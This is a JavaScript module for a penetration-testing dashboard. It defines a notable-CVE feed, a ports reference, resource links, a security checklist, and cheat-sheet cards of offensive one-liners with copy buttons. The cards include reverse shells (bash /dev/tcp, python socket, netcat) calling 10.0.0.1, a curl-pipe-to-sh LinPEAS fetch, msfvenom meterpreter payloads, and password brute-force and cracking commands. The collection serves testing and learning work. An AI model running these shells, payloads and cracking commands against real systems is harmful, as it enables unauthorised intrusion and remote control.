// Cybersecurity content for the Sentinel console: notable CVEs, cheat sheets,
// a common-ports reference, learning resources, and a security-posture checklist.
const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

// ---------- data ----------
export const CVE_FEED = [
  { id: "CVE-2024-3094", name: "XZ Utils backdoor", sev: "critical", cvss: "10.0", date: "2024", tag: "Supply chain / RCE", desc: "Malicious code planted in liblzma grants SSH remote code execution." },
  { id: "CVE-2021-44228", name: "Log4Shell", sev: "critical", cvss: "10.0", date: "2021", tag: "RCE", desc: "JNDI lookup in Log4j 2 lets attackers run arbitrary code via a crafted string." },
  { id: "CVE-2021-4034", name: "PwnKit", sev: "high", cvss: "7.8", date: "2022", tag: "Local privesc", desc: "polkit's pkexec memory corruption gives any local user root." },
  { id: "CVE-2022-0847", name: "Dirty Pipe", sev: "high", cvss: "7.8", date: "2022", tag: "Linux privesc", desc: "Overwrite read-only files via the Linux pipe page cache." },
  { id: "CVE-2020-1472", name: "Zerologon", sev: "critical", cvss: "10.0", date: "2020", tag: "AD / domain takeover", desc: "Netlogon crypto flaw resets the domain controller machine password." },
  { id: "CVE-2019-0708", name: "BlueKeep", sev: "critical", cvss: "9.8", date: "2019", tag: "RDP / wormable RCE", desc: "Pre-auth RCE in Windows Remote Desktop Services." },
  { id: "CVE-2017-0144", name: "EternalBlue", sev: "critical", cvss: "8.1", date: "2017", tag: "SMB / wormable", desc: "SMBv1 flaw behind WannaCry and NotPetya." },
  { id: "CVE-2014-0160", name: "Heartbleed", sev: "high", cvss: "7.5", date: "2014", tag: "Info leak", desc: "OpenSSL heartbeat over-read leaks server memory, including keys." },
  { id: "CVE-2023-4863", name: "libwebp heap overflow", sev: "critical", cvss: "8.8", date: "2023", tag: "Client-side RCE", desc: "WebP image parsing bug exploited in the wild across browsers." },
  { id: "CVE-2018-7600", name: "Drupalgeddon2", sev: "critical", cvss: "9.8", date: "2018", tag: "Web / RCE", desc: "Unauthenticated remote code execution in Drupal core." },
];
const cveUrl = (id) => "https://nvd.nist.gov/vuln/detail/" + id;

export const CHEATS = [
  { id: "nmap", name: "Nmap", cat: "Recon", lines: [
    ["Quick top-1000 + versions", "nmap -sV -sC -oN scan.txt TARGET"],
    ["All ports, fast", "nmap -p- --min-rate 5000 -T4 TARGET"],
    ["UDP top ports", "sudo nmap -sU --top-ports 50 TARGET"],
    ["Vuln scripts", "nmap --script vuln TARGET"],
  ]},
  { id: "revshell", name: "Reverse shells", cat: "Shells", lines: [
    ["Bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
    ["Python3", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"],
    ["Netcat", "nc -e /bin/sh 10.0.0.1 4444"],
    ["Listener", "nc -lvnp 4444"],
  ]},
  { id: "tty", name: "Upgrade shell (TTY)", cat: "Shells", lines: [
    ["Spawn PTY", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
    ["Background + stty", "Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm"],
    ["Socat full TTY", "socat file:`tty`,raw,echo=0 tcp-listen:4444"],
  ]},
  { id: "privesc", name: "Linux privesc", cat: "Privesc", lines: [
    ["SUID binaries", "find / -perm -4000 -type f 2>/dev/null"],
    ["Sudo rights", "sudo -l"],
    ["Writable cron / paths", "cat /etc/crontab ; ls -la /etc/cron.*"],
    ["Kernel / distro", "uname -a ; cat /etc/os-release"],
    ["Run LinPEAS", "curl -L https://.../linpeas.sh | sh"],
  ]},
  { id: "transfer", name: "File transfer", cat: "Transfer", lines: [
    ["HTTP server", "python3 -m http.server 8000"],
    ["Download (curl)", "curl http://10.0.0.1:8000/f -o f"],
    ["Download (wget)", "wget http://10.0.0.1:8000/f"],
    ["Base64 paste", "base64 -w0 f  # decode: base64 -d"],
  ]},
  { id: "web", name: "Web / dir brute", cat: "Web", lines: [
    ["gobuster", "gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt"],
    ["ffuf", "ffuf -u http://TARGET/FUZZ -w wordlist.txt"],
    ["nuclei", "nuclei -u http://TARGET"],
    ["sqlmap", "sqlmap -u 'http://TARGET/?id=1' --batch --dbs"],
  ]},
  { id: "crack", name: "Password cracking", cat: "Cracking", lines: [
    ["hashcat MD5", "hashcat -m 0 hash.txt rockyou.txt"],
    ["hashcat NTLM", "hashcat -m 1000 hash.txt rockyou.txt"],
    ["John (auto)", "john --wordlist=rockyou.txt hash.txt"],
    ["Hydra SSH", "hydra -L users -P rockyou.txt ssh://TARGET"],
  ]},
  { id: "pivot", name: "Pivoting / tunnels", cat: "Pivoting", lines: [
    ["Local forward", "ssh -L 8080:127.0.0.1:80 user@TARGET"],
    ["Dynamic (SOCKS)", "ssh -D 1080 user@TARGET"],
    ["Chisel client", "chisel client 10.0.0.1:8000 R:socks"],
  ]},
  { id: "msf", name: "msfvenom payloads", cat: "Payloads", lines: [
    ["Linux ELF", "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o p.elf"],
    ["Windows EXE", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o p.exe"],
    ["PHP", "msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o s.php"],
  ]},
];

export const PORTS = [
  ["21", "FTP", "File transfer — anonymous login, clear-text creds"],
  ["22", "SSH", "Remote shell — brute force, key auth"],
  ["23", "Telnet", "Clear-text remote shell"],
  ["25", "SMTP", "Mail — user enum (VRFY), open relay"],
  ["53", "DNS", "Zone transfer, subdomain enum"],
  ["80", "HTTP", "Web — dir brute, injection, LFI"],
  ["110", "POP3", "Mail retrieval"],
  ["135", "MSRPC", "Windows RPC endpoint mapper"],
  ["139/445", "SMB", "Shares, EternalBlue, null sessions"],
  ["143", "IMAP", "Mail retrieval"],
  ["161", "SNMP", "Device info — community strings (public)"],
  ["389", "LDAP", "Directory — AD enumeration"],
  ["443", "HTTPS", "Web over TLS — heartbleed, cert info"],
  ["1433", "MSSQL", "Database — xp_cmdshell"],
  ["3306", "MySQL", "Database — weak creds"],
  ["3389", "RDP", "Remote desktop — BlueKeep, brute force"],
  ["5432", "Postgres", "Database"],
  ["5985/5986", "WinRM", "Windows remote mgmt — evil-winrm"],
  ["6379", "Redis", "Cache — unauth RCE via module load"],
  ["8080", "HTTP-alt", "Proxies, Tomcat, Jenkins"],
];

export const RESOURCES = [
  { name: "OWASP Top 10", tag: "Web", desc: "The canonical web app risk list.", url: "https://owasp.org/www-project-top-ten/" },
  { name: "HackTricks", tag: "Methodology", desc: "The pentester's field manual for every service.", url: "https://book.hacktricks.xyz/" },
  { name: "GTFOBins", tag: "Privesc", desc: "Unix binaries to break out of restricted shells.", url: "https://gtfobins.github.io/" },
  { name: "LOLBAS", tag: "Windows", desc: "Living-off-the-land Windows binaries.", url: "https://lolbas-project.github.io/" },
  { name: "PayloadsAllTheThings", tag: "Payloads", desc: "Injection & bypass payloads for everything.", url: "https://github.com/swisskyrepo/PayloadsAllTheThings" },
  { name: "PortSwigger Academy", tag: "Learn", desc: "Free hands-on web security labs.", url: "https://portswigger.net/web-security" },
  { name: "TryHackMe", tag: "Practice", desc: "Guided rooms for beginners to pros.", url: "https://tryhackme.com/" },
  { name: "Hack The Box", tag: "Practice", desc: "Realistic vulnerable machines.", url: "https://www.hackthebox.com/" },
  { name: "Exploit-DB", tag: "Exploits", desc: "Public exploits & shellcode archive.", url: "https://www.exploit-db.com/" },
  { name: "MITRE ATT&CK", tag: "Framework", desc: "Adversary tactics & techniques matrix.", url: "https://attack.mitre.org/" },
  { name: "CyberChef", tag: "Tools", desc: "The cyber swiss-army knife for data.", url: "https://gchq.github.io/CyberChef/" },
  { name: "revshells.com", tag: "Tools", desc: "Generate reverse shells for any language.", url: "https://www.revshells.com/" },
  { name: "CrackStation", tag: "Cracking", desc: "Free hash lookup (huge rainbow tables).", url: "https://crackstation.net/" },
  { name: "SecLists", tag: "Wordlists", desc: "The security tester's wordlist collection.", url: "https://github.com/danielmiessler/SecLists" },
  { name: "Shodan", tag: "Recon", desc: "Search engine for internet-connected devices.", url: "https://www.shodan.io/" },
  { name: "NVD / CVE", tag: "Intel", desc: "Official vulnerability database.", url: "https://nvd.nist.gov/" },
];

export const POSTURE = [
  { id: "2fa", t: "Enable 2FA / MFA everywhere", d: "Especially email, GitHub, cloud, and password manager." },
  { id: "pwmgr", t: "Use a password manager", d: "Unique random passwords per site." },
  { id: "patch", t: "Keep systems & tools patched", d: "Auto-update OS and browsers; update CLI tools regularly." },
  { id: "disk", t: "Full-disk encryption on", d: "LUKS / FileVault / BitLocker on laptops." },
  { id: "backup", t: "3-2-1 backups", d: "3 copies, 2 media, 1 offsite. Test restores." },
  { id: "vpn", t: "VPN on untrusted networks", d: "Avoid raw traffic on public Wi-Fi." },
  { id: "scope", t: "Only test what you're authorized to", d: "Written permission before any active testing." },
];

// ---------- helpers ----------
const line = (label, cmd) => `<div class="cs-line"><div class="cs-label">${esc(label)}</div><div class="cs-cmd"><code>${esc(cmd)}</code><button class="cs-copy" title="copy">copy</button></div></div>`;
const sevBadge = (s) => `<span class="sev ${s}">${s}</span>`;
function wireCopy(root) {
  root.addEventListener("click", (e) => {
    const b = e.target.closest(".cs-copy"); if (!b) return;
    const code = b.closest(".cs-cmd").querySelector("code");
    navigator.clipboard?.writeText(code.textContent).then(() => { b.textContent = "copied"; setTimeout(() => (b.textContent = "copy"), 1100); });
  });
}
function posLoad() { try { return JSON.parse(localStorage.getItem("sw_posture")) || []; } catch (_) { return []; } }
function posSave(a) { try { localStorage.setItem("sw_posture", JSON.stringify(a)); } catch (_) {} }

// ---------- full sections ----------
export function renderThreat(main) {
  main.innerHTML = `
    <h1 class="pg-h1">Threat intel</h1>
    <p class="muted pg-sub">Notable and high-impact vulnerabilities every defender and tester should know. Click any card for the full NVD entry.</p>
    <div class="feed-grid">
      ${CVE_FEED.map((c) => `
        <a class="feed-card" href="${cveUrl(c.id)}" target="_blank" rel="noopener">
          <div class="feed-top"><span class="feed-id mono">${esc(c.id)}</span>${sevBadge(c.sev)}</div>
          <div class="feed-name">${esc(c.name)}</div>
          <div class="feed-desc">${esc(c.desc)}</div>
          <div class="feed-meta"><span class="chip">${esc(c.tag)}</span><span class="muted">CVSS ${esc(c.cvss)} · ${esc(c.date)}</span></div>
        </a>`).join("")}
    </div>
    <h2 class="pg-h2">Common ports &amp; attack surface</h2>
    <div class="card ports-card">
      <table class="ports"><thead><tr><th>Port</th><th>Service</th><th>Notes</th></tr></thead>
        <tbody>${PORTS.map(([p, s, n]) => `<tr><td class="mono">${esc(p)}</td><td><strong>${esc(s)}</strong></td><td class="muted">${esc(n)}</td></tr>`).join("")}</tbody>
      </table>
    </div>`;
}

export function renderCheats(main) {
  const cats = [...new Set(CHEATS.map((c) => c.cat))];
  main.innerHTML = `
    <h1 class="pg-h1">Cheat sheets</h1>
    <p class="muted pg-sub">Battle-tested one-liners for engagements. Replace <code>TARGET</code> / <code>IP</code> and copy.</p>
    <div class="cs-filter" id="csFilter">
      <button class="chip on" data-c="all">All</button>
      ${cats.map((c) => `<button class="chip" data-c="${esc(c)}">${esc(c)}</button>`).join("")}
    </div>
    <div class="cs-grid" id="csGrid">
      ${CHEATS.map((c) => `<div class="cs-card" data-cat="${esc(c.cat)}">
        <div class="cs-head"><h3>${esc(c.name)}</h3><span class="chip">${esc(c.cat)}</span></div>
        ${c.lines.map(([l, cmd]) => line(l, cmd)).join("")}
      </div>`).join("")}
    </div>`;
  wireCopy(main);
  const grid = main.querySelector("#csGrid");
  main.querySelector("#csFilter").onclick = (e) => {
    const b = e.target.closest(".chip"); if (!b) return;
    main.querySelectorAll("#csFilter .chip").forEach((x) => x.classList.toggle("on", x === b));
    const c = b.dataset.c;
    grid.querySelectorAll(".cs-card").forEach((card) => { card.style.display = (c === "all" || card.dataset.cat === c) ? "" : "none"; });
  };
}

export function renderLearn(main) {
  main.innerHTML = `
    <h1 class="pg-h1">Learn &amp; resources</h1>
    <p class="muted pg-sub">Curated hubs to level up — methodology, labs, payloads, and intel.</p>
    <div class="res-grid">
      ${RESOURCES.map((r) => `<a class="res-card" href="${r.url}" target="_blank" rel="noopener">
        <div class="res-top"><span class="res-name">${esc(r.name)}</span><span class="chip">${esc(r.tag)}</span></div>
        <div class="res-desc">${esc(r.desc)}</div>
        <div class="res-link">${esc(r.url.replace(/^https?:\/\//, "").replace(/\/$/, ""))} ↗</div>
      </a>`).join("")}
    </div>`;
}

// ---------- home widgets ----------
export function homeWidgetsHTML() {
  const done = posLoad();
  const pct = Math.round((done.length / POSTURE.length) * 100);
  const topCves = CVE_FEED.slice(0, 5);
  const featCheats = CHEATS.slice(0, 4);
  const featRes = RESOURCES.slice(0, 6);
  return `
    <div class="home-cols">
      <div class="hc-main">
        <div class="panel">
          <div class="panel-h"><h2 class="pg-h2" style="margin:0">Threat intel</h2><button class="link-btn" data-go="threat">View all →</button></div>
          <div class="feed-list">
            ${topCves.map((c) => `<a class="feed-row" href="${cveUrl(c.id)}" target="_blank" rel="noopener">
              ${sevBadge(c.sev)}<span class="fr-id mono">${esc(c.id)}</span><span class="fr-name">${esc(c.name)}</span><span class="fr-tag muted">${esc(c.tag)}</span></a>`).join("")}
          </div>
        </div>
        <div class="panel">
          <div class="panel-h"><h2 class="pg-h2" style="margin:0">Featured cheat sheets</h2><button class="link-btn" data-go="cheats">All cheat sheets →</button></div>
          <div class="cs-grid">
            ${featCheats.map((c) => `<div class="cs-card compact"><div class="cs-head"><h3>${esc(c.name)}</h3><span class="chip">${esc(c.cat)}</span></div>
              ${c.lines.slice(0, 2).map(([l, cmd]) => line(l, cmd)).join("")}</div>`).join("")}
          </div>
        </div>
      </div>
      <div class="hc-side">
        <div class="panel posture">
          <div class="panel-h"><h2 class="pg-h2" style="margin:0">Security posture</h2><span class="pct" id="posPct">${pct}%</span></div>
          <div class="progress"><div class="progress-bar" id="posBar" style="width:${pct}%"></div></div>
          <div class="pos-list" id="posList">
            ${POSTURE.map((p) => `<label class="pos-item"><input type="checkbox" data-pid="${p.id}" ${done.includes(p.id) ? "checked" : ""}><span class="pos-text"><strong>${esc(p.t)}</strong><span class="muted">${esc(p.d)}</span></span></label>`).join("")}
          </div>
        </div>
        <div class="panel">
          <div class="panel-h"><h2 class="pg-h2" style="margin:0">Resources</h2><button class="link-btn" data-go="learn">Explore →</button></div>
          <div class="res-chips">
            ${featRes.map((r) => `<a class="res-chip" href="${r.url}" target="_blank" rel="noopener">${esc(r.name)}</a>`).join("")}
          </div>
        </div>
      </div>
    </div>`;
}

export function wireHome(main, show) {
  wireCopy(main);
  main.querySelectorAll("[data-go]").forEach((b) => (b.onclick = () => show(b.dataset.go)));
  const list = main.querySelector("#posList");
  if (list) list.addEventListener("change", (e) => {
    const cb = e.target.closest("input[data-pid]"); if (!cb) return;
    let done = posLoad();
    if (cb.checked) { if (!done.includes(cb.dataset.pid)) done.push(cb.dataset.pid); }
    else done = done.filter((x) => x !== cb.dataset.pid);
    posSave(done);
    const pct = Math.round((done.length / POSTURE.length) * 100);
    main.querySelector("#posBar").style.width = pct + "%";
    main.querySelector("#posPct").textContent = pct + "%";
  });
}

export const COUNTS = { cheats: CHEATS.length, cves: CVE_FEED.length, resources: RESOURCES.length, ports: PORTS.length };
